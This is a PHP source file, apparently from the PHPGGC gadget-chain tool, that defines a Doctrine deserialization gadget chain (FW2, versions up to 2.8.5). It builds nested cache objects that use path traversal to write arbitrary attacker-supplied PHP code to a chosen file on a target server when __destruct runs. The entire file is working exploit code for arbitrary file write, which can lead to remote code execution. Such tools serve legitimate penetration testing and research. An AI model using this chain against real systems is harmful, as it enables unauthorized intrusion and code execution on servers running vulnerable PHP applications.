<?php

namespace GadgetChain\Doctrine;

class FW2 extends \PHPGGC\GadgetChain\FileWrite
{
    public static $version = '<= 2.8.5';
    public static $vector = '__destruct';
    public static $author = 'crlf';
    public static $information = 'Tested on PHP7/8. Creates a side directory "8a", can be removed later.';

    public function generate(array $parameters)
    {
		$writablePath = dirname($parameters['remote_path']);
		$fileName = basename($parameters['remote_path']);
		$phpCode = file_get_contents($parameters['local_path']);
		
		return array(
		
			new \Doctrine\Common\Cache\Psr6\CacheAdapter(
				new \Doctrine\Common\Cache\Psr6\CacheItem(0), new \Doctrine\Common\Cache\FilesystemCache(
					'/'.str_repeat('x', 300), $writablePath
				)),
			new \Doctrine\Common\Cache\Psr6\CacheAdapter(
				new \Doctrine\Common\Cache\Psr6\CacheItem($phpCode), new \Doctrine\Common\Cache\FilesystemCache(
					'/../../' . $fileName, $writablePath
				))
		);
    }
}
